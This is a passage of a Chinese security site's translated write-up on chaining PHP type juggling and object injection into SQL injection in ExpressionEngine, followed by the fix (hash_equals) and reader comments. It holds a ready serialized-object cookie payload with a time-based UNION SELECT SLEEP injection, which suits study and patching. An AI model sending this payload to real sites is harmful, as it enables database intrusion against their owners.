a:1:{s:+13:&quot;:new:username&quot;;O:67:&quot;EllisLab\\ExpressionEngine\\Library\\Parser\\Conditional\\Token\\Variable&quot;:1:{s:+6:&quot;lexeme&quot;;s:+31:&quot;1&nbsp;UNION&nbsp;SELECT&nbsp;SLEEP(5)&nbsp;#&nbsp;v40vP&quot;;}}&nbsp;-&nbsp;0e223968250284091802226333601821</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">然后发出请求（请再次注意反斜杠）：</span></p><pre class="brush:plain;toolbar:false">Cookie:&nbsp;exp_flash=a%3a1%3a{s%3a%2b13%3a&quot;%3anew%3ausername&quot;%3bO%3a67%3a&quot;EllisLab\\\\\ExpressionEngine\\\\\Library\\\\\Parser\\\\\Conditional\\\\\Token\\\\\Variable&quot;%3a1%3a{s%3a%2b6%3a&quot;lexeme&quot;%3bs%3a%2b31%3a&quot;1+UNION+SELECT+SLEEP(5)+%23+v40vP&quot;%3b}}0e223968250284091802226333601821</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">等待5秒，我们便能收到服务器响应！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞修复</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">将以下代码：</span></p><pre class="brush:plain;toolbar:false">if&nbsp;(md5($payload.$this-&gt;sess_crypt_key)&nbsp;==&nbsp;$signature)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">替换为：</span></p><pre class="brush:php;toolbar:false">if&nbsp;(hash_equals(md5($payload.$this-&gt;sess_crypt_key),$signature))</pre></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/" target="_blank">原文链接：https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】从弱类型利用以及对象注入到SQL注入 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3486" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01c3fa340d3d0b473f.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="21455519" class="response" data-bind-id="21455519" data-target="12999" user-name="我是传奇C" href="javascript:;">
                我是传奇C            </a>
                        <span class="comment-time">2017-04-01 10:09:30</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="21455519" data-target="12999">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12999" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">很精彩的一套组合拳，学习了</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/3x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11817" user-name="235" href="javascript:;">
                235            </a>
                        <span class="comment-time">2017-02-15 10:02:46</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11817">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11817" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">思路学习了，但有点强行漏洞</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/10x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11795" user-name="你全家都是黑客" href="javascript:;">
                你全家都是黑客            </a>
                        <span class="comment-time">2017-02-13 15:17:54</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11795">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11795" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">我都看懵了，如果知道sess_crypt_key就可以直接伪造cookie了，为啥还这么绕</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="101401772" data-target="11790">Zacker</a> <span class="comment-time">2017-02-13 10:59:30</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="101401772" data-target="11790">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11790" data-type="comment">点赞</a></span>            </div>
            <p>请问作者，你的测试是在假设我们知道sess_crypt_key的值的前提下通过暴力尝试达到弱类型判断绕过的，但是一般情况下开源软件初始化时不是应该重新配置这个参数吗？是不是可以理解为，如果站点重新配置了这个salt，后面的一切都无从谈起？</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="419303956" class="response" data-bind-id="419303956" data-target="11794" user-name="匿名用户" href="javascript:;">
                匿名用户            </a>
                        <span class="comment-time">2017-02-13 14:21:29</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="419303956" data-target="11794">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11794" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">原文作者是白盒审计，找出cookie处理不当问题,如果不知道这个key，当然之后的弱类型碰撞无从谈起</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="101401772" data-target="11790">Zacker</a> <span class="comment-time">2017-02-13 10:59:30</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="101401772" data-target="11790">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11790" data-type="comment">点赞</a></span>            </div>
            <p>请问作者，你的测试是在假设我们知道sess_crypt_key的值的前提下通过暴力尝试达到弱类型判断绕过的，但是一般情况下开源软件初始化时不是应该重新配置这个参数吗？是不是可以理解为，如果站点重新配置了这个salt，后面的一切都无从谈起？</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="101401772" class="response" data-bind-id="101401772" data-target="11790" user-name="Zacker" href="javascript:;">
                Zacker            </a>
                        <span class="comment-time">2017-02-13 10:59:30</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="101401772" data-target="11790">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11790" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">请问作者，你的测试是在假设我们知道sess_crypt_key的值的前提下通过暴力尝试达到弱类型判断绕过的，但是一般情况下开源软件初始化时不是应该重新配置这个参数吗？是不是可以理解为，如果站点重新配置了这个salt，后面的一切都无从谈起？</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11755" user-name="Anonymous" href="javascript:;">
                Anonymous            </a>
                        <span class="comment-time">2017-02-10 13:03:11</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11755">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11755" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">已修正，感谢提醒</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="114898948" data-target="11753">0xE9</a> <span class="comment-time">2017-02-10 12:35:07</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="114898948" data-target="11753">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11753" data-type="comment">点赞</a></span>            </div>
            <p>后面漏洞修复的替换，作者是不是贴错了</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11754" user-name="匿名用户" href="javascript:;">
                匿名用户            </a>
                        <span class="comment-time">2017-02-10 12:46:31</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11754">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11754" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">贴错了 马上修改</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="114898948" data-target="11753">0xE9</a> <span class="comment-time">2017-02-10 12:35:07</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="114898948" data-target="11753">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11753" data-type="comment">点赞</a></span>            </div>
            <p>后面漏洞修复的替换，作者是不是贴错了</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/0x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="114898948" class="response" data-bind-id="114898948" data-target="11753" user-name="0xE9" href="javascript:;">
                0xE9            </a>
                        <span class="comment-time">2017-02-10 12:35:07</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="114898948" data-target="11753">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11753" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">后面漏洞修复的替换，作者是不是贴错了</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/10x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11752" user-name="大表哥" href="javascript:;">
                大表哥            </a>
                        <span class="comment-time">2017-02-10 12:14:27</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11752">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11752" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">好复杂啊</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="11751" user-name="Helen" href="javascript:;">
                Helen            </a>
                        <span class="comment-time">2017-02-10 12:00:32</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="11751">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_11751" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">学到了 精彩</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3486" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
